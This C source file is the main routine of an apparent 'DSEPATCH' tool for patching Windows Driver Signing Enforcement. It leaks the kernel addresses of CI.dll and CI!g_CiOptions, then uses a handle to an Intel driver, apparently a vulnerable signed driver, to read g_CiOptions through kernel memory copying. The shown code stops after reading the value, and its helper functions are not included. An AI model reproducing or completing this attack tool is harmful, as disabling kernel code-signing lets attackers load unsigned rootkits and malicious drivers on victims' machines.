/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "util.h"
#include "ci.h"
#include "intel.h"

int main(int argc, char **argv)
{
  HANDLE hDriver       = 0;
  LPVOID CiImagepMem   = 0;
  LPVOID CiImageBase   = 0;
  LPVOID CigOptsBase   = 0;
  LPVOID PhysAddr      = 0;
  DWORD  CiImageLen    = 0;
  ULONG  CurrentCiVal  = 0;

  CiImageBase = KeGetBase("CI.dll", &CiImageLen);
  if ( (CiImageBase != NULL) )
  {
    printf("[+] Leaked CI @ %p\n", CiImageBase);
    if ( (CigOptsBase = GetCiOptions1(CiImageBase)) != NULL )
    {
      printf("[+] Leaked CI!g_CiOptions @ %p\n", CigOptsBase);

      system("pause");
      if ( (hDriver = GetHandle()) != NULL ) 
      {
	      printf("[+] Opened intel driver @ %p\n", hDriver);

	      MemCpy(
		(HANDLE)hDriver, 
		(ULONG64)&CurrentCiVal, 
		(ULONG64)CigOptsBase, 
		sizeof(ULONG)
	      );

	      printf("[+] CurrentCiVal = 0x%x\n", CurrentCiVal);
      };
    };
  };
};
